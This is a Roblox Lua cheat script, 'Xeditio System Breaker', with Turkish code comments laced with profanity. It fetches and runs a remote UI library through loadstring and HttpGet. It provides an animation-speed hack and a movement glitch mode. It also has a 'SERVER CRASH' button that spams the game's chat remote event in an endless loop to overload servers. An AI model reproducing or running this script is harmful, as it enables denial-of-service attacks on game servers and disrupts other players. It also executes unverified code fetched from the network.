local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "XEDITIO-SYSTEM-BREAKER-UNIVERSAL",
   Icon = 0,
   LoadingTitle = "Xeditio Software",
   LoadingSubtitle = "by Xeditio",
   ConfigurationSaving = {
      Enabled = true,
      FolderName = "XeditioUniversal",
      FileName = "Xeditio Software"
   },
   KeySystem = false
})

-- Ana Sekme amına
local MainTab = Window:CreateTab("System Breaker", 4483362458)

-- 1. Yürüme Animasyon Hızı (Tam Fixlendi amına)
MainTab:CreateSlider({
   Name = "Animasyon Yürüme Hızı",
   Range = {1, 1000}, -- Sınırı 1000'e kilitledim amına
   Increment = 1,
   Suffix = "Hız",
   CurrentValue = 1,
   Callback = function(Value)
      _G.WalkAnimSpeed = Value
      local char = game.Players.LocalPlayer.Character
      if char and char:FindFirstChildOfClass("Humanoid") then
         local hum = char:FindFirstChildOfClass("Humanoid")
         -- Döngüye gerek kalmadan hızı mermi (tövbeler olsun) gibi sabitler amına
         task.spawn(function()
            while _G.WalkAnimSpeed == Value do
               for _, track in pairs(hum:GetPlayingAnimationTracks()) do
                   if track.Name == "WalkAnim" or track.Name == "RunAnim" or track.Name == "Walk" then
                       track:AdjustSpeed(Value)
                   end
               end
               task.wait(0.1)
            end
         end)
      end
   end,
})

-- 2. EGOR (Takılma Arttırıldı amına)
MainTab:CreateSlider({
   Name = "Egor (Takılma Modu)",
   Range = {1, 10}, -- Sınırı 10'a kilitledim amına
   Increment = 1,
   Suffix = "Sertlik",
   CurrentValue = 1,
   Callback = function(Value)
      _G.EgorLevel = Value
      if Value > 1 then
         task.spawn(function()
            while _G.EgorLevel == Value do
               local char = game.Players.LocalPlayer.Character
               local root = char and char:FindFirstChild("HumanoidRootPart")
               if root then
                  -- Takılma etkisini mermi (tövbeler olsun) gibi arttırdım valla amına
                  root.Velocity = root.Velocity * (1 / (Value * 2))
                  root.CFrame = root.CFrame * CFrame.new(0, 0, 0.1)
                  task.wait(0.05 / Value)
               end
               task.wait(0.01)
            end
         end)
      end
   end,
})

-- 3. Server Crash (Güçlendirilmiş Metod amına)
MainTab:CreateButton({
   Name = "SERVER CRASH (HARD SPAM AMINA)",
   Callback = function()
      Rayfield:Notify({Title = "Xeditio", Content = "Sunucu dinden imandan çıkıyor amına!", Duration = 5})
      -- Birden fazla metodla sunucuyu mermi (tövbeler olsun) gibi yorarız amına
      task.spawn(function()
         while true do
            -- Remote Event Spam amına
            local event = game:GetService("ReplicatedStorage"):FindFirstChild("SayChatReplicate", true) or game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents", true)
            if event then
               for i = 1, 100 do
                  -- Hem chat hem de boş veri mermi (tövbeler olsun) gibi gönderilir amına
                  pcall(function()
                     event:FireServer("Xeditio Reis Sistemi Kırdı amına " .. math.random(1,999999))
                  end)
               end
            end
            task.wait(0.1)
         end
      end)
   end,
})

Rayfield:Notify({
   Title = "Xeditio System Breaker V41",
   Content = "Hatalar mermi (tövbeler olsun) gibi temizlendi amına!",
   Duration = 5
})
